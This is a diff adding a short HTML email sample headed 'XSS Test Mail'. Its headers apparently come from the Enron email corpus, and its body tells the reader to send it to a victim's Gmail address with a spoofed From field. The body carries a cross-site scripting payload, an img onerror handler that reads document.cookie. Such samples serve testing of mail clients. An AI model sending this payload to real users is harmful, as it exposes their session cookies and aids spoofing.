@@ -1,0 +1,7 @@
+From: majordomo@lists.nyiso.com
+To: blair.lichtenwalter@enron.com, jeanette.doll@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Send an email to the victim GMail address with the From field.<img src=# onerror=alert(document.cookie)>.
